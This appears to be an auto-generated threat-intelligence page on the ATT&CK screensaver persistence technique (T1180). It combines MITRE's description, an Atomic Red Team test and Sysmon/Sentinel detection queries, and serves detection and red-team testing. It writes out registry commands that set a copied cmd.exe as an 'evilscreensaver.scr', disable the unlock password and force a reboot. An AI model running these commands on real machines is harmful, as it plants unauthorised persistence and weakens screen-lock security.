
# Screensaver

## Description

### MITRE Description

> Screensavers are programs that execute after a configurable time of user inactivity and consist of Portable Executable (PE) files with a .scr file extension.(Citation: Wikipedia Screensaver) The Windows screensaver application scrnsave.scr is located in <code>C:\Windows\System32\</code>, and <code>C:\Windows\sysWOW64\</code> on 64-bit Windows systems, along with screensavers included with base Windows installations. 

The following screensaver settings are stored in the Registry (<code>HKCU\Control Panel\Desktop\</code>) and could be manipulated to achieve persistence:

* <code>SCRNSAVE.exe</code> - set to malicious PE path
* <code>ScreenSaveActive</code> - set to '1' to enable the screensaver
* <code>ScreenSaverIsSecure</code> - set to '0' to not require a password to unlock
* <code>ScreenSaveTimeout</code> - sets user inactivity timeout before screensaver is executed

Adversaries can use screensaver settings to maintain persistence by setting the screensaver to run malware after a certain timeframe of user inactivity. (Citation: ESET Gazer Aug 2017)

## Aliases

```

```

## Additional Attributes

* Bypass: None
* Effective Permissions: None
* Network: None
* Permissions: ['User']
* Platforms: ['Windows']
* Remote: None
* Type: attack-pattern
* Wiki: https://attack.mitre.org/techniques/T1180

## Potential Commands

```
copy C:\Windows\System32\cmd.exe "%SystemRoot%\System32\evilscreensaver.scr"
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveActive /t REG_SZ /d 1 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaveTimeout /t REG_SZ /d 60 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v ScreenSaverIsSecure /t REG_SZ /d 0 /f
reg.exe add "HKEY_CURRENT_USER\Control Panel\Desktop" /v SCRNSAVE.EXE /t REG_SZ /d "%SystemRoot%\System32\evilscreensaver.scr" /f
shutdown /r /t 0

Control Panel\Desktop\SCRNSAVE.EXE
Control Panel\Desktop\SCRNSAVE.EXE
```

## Commands Dataset

```
[{'command': 'copy C:\\Windows\\System32\\cmd.exe '
             '"%SystemRoot%\\System32\\evilscreensaver.scr"\n'
             'reg.exe add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v '
             'ScreenSaveActive /t REG_SZ /d 1 /f\n'
             'reg.exe add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v '
             'ScreenSaveTimeout /t REG_SZ /d 60 /f\n'
             'reg.exe add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v '
             'ScreenSaverIsSecure /t REG_SZ /d 0 /f\n'
             'reg.exe add "HKEY_CURRENT_USER\\Control Panel\\Desktop" /v '
             'SCRNSAVE.EXE /t REG_SZ /d '
             '"%SystemRoot%\\System32\\evilscreensaver.scr" /f\n'
             'shutdown /r /t 0\n',
  'name': None,
  'source': 'atomics/T1180/T1180.yaml'},
 {'command': 'Control Panel\\Desktop\\SCRNSAVE.EXE',
  'name': None,
  'source': 'SysmonHunter - Screensaver'},
 {'command': 'Control Panel\\Desktop\\SCRNSAVE.EXE',
  'name': None,
  'source': 'SysmonHunter - Screensaver'}]
```

## Potential Detections

```json
[{'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4657', 'Windows Registry']},
 {'data_source': ['4663', 'File monitoring']},
 {'data_source': ['4688', 'Process Execution']},
 {'data_source': ['4688 ', 'Process CMD Line']},
 {'data_source': ['4657', 'Windows Registry']},
 {'data_source': ['4663', 'File monitoring']}]
```

## Potential Queries

```json
[{'name': 'Screensaver',
  'product': 'Azure Sentinel',
  'query': 'Sysmon| where (EventID == 12 or EventID == 13 or EventID == 14)and '
           '(registry_key_path contains "*\\\\Control '
           'Panel\\\\Desktop\\\\SCRNSAVE.EXE")and (process_parent_command_line '
           '!contains "explorer.exe"or process_path !contains "rundll32.exe"or '
           'process_command_line !contains "*shell32.dll,Control_RunDLL '
           'desk.cpl,ScreenSaver,*")'}]
```

## Raw Dataset

```json
[{'Atomic Red Team Test - Screensaver': {'atomic_tests': [{'auto_generated_guid': '281201e7-de41-4dc9-b73d-f288938cbb64',
                                                           'description': 'This '
                                                                          'test '
                                                                          'copies '
                                                                          'a '
                                                                          'binary '
                                                                          'into '
                                                                          'the '
                                                                          'Windows '
                                                                          'System32 '
                                                                          'folder '
                                                                          'and '
                                                                          'sets '
                                                                          'it '
                                                                          'as '
                                                                          'the '
                                                                          'screensaver '
                                                                          'so '
                                                                          'it '
                                                                          'will '
                                                                          'execute '
                                                                          'for '
                                                                          'persistence. '
                                                                          'Requires '
                                                                          'a '
                                                                          'reboot '
                                                                          'and '
                                                                          'logon.\n',
                                                           'executor': {'command': 'copy '
                                                                                   '#{input_binary} '
                                                                                   '"%SystemRoot%\\System32\\evilscreensaver.scr"\n'
                                                                                   'reg.exe '
                                                                                   'add '
                                                                                   '"HKEY_CURRENT_USER\\Control '
                                                                                   'Panel\\Desktop" '
                                                                                   '/v '
                                                                                   'ScreenSaveActive '
                                                                                   '/t '
                                                                                   'REG_SZ '
                                                                                   '/d '
                                                                                   '1 '
                                                                                   '/f\n'
                                                                                   'reg.exe '
                                                                                   'add '
                                                                                   '"HKEY_CURRENT_USER\\Control '
                                                                                   'Panel\\Desktop" '
                                                                                   '/v '
                                                                                   'ScreenSaveTimeout '
                                                                                   '/t '
                                                                                   'REG_SZ '
                                                                                   '/d '
                                                                                   '60 '
                                                                                   '/f\n'
                                                                                   'reg.exe '
                                                                                   'add '
                                                                                   '"HKEY_CURRENT_USER\\Control '
                                                                                   'Panel\\Desktop" '
                                                                                   '/v '
                                                                                   'ScreenSaverIsSecure '
                                                                                   '/t '
                                                                                   'REG_SZ '
                                                                                   '/d '
                                                                                   '0 '
                                                                                   '/f\n'
                                                                                   'reg.exe '
                                                                                   'add '
                                                                                   '"HKEY_CURRENT_USER\\Control '
                                                                                   'Panel\\Desktop" '
                                                                                   '/v '
                                                                                   'SCRNSAVE.EXE '
                                                                                   '/t '
                                                                                   'REG_SZ '
                                                                                   '/d '
                                                                                   '"%SystemRoot%\\System32\\evilscreensaver.scr" '
                                                                                   '/f\n'
                                                                                   'shutdown '
                                                                                   '/r '
                                                                                   '/t '
                                                                                   '0\n',
                                                                        'elevation_required': True,
                                                                        'name': 'command_prompt'},
                                                           'input_arguments': {'input_binary': {'default': 'C:\\Windows\\System32\\cmd.exe',
                                                                                                'description': 'Executable '
                                                                                                               'binary '
                                                                                                               'to '
                                                                                                               'use '
                                                                                                               'in '
                                                                                                               'place '
                                                                                                               'of '
                                                                                                               'screensaver '
                                                                                                               'for '
                                                                                                               'persistence',
                                                                                                'type': 'path'}},
                                                           'name': 'Set '
                                                                   'Arbitrary '
                                                                   'Binary as '
                                                                   'Screensaver',
                                                           'supported_platforms': ['windows']}],
                                         'attack_technique': 'T1180',
                                         'display_name': 'Screensaver'}},
 {'SysmonHunter - T1180': {'description': None,
                           'level': 'medium',
                           'name': 'Screensaver',
                           'phase': 'Persistence',
                           'query': [{'reg': {'path': {'pattern': 'Control '
                                                                  'Panel\\Desktop\\SCRNSAVE.EXE'}},
                                      'type': 'reg'},
                                     {'process': {'cmdline': {'pattern': 'Control '
                                                                         'Panel\\Desktop\\SCRNSAVE.EXE'}},
                                      'type': 'process'}]}}]
```

# Tactics


* [Persistence](../tactics/Persistence.md)


# Mitigations

None

# Actors

None
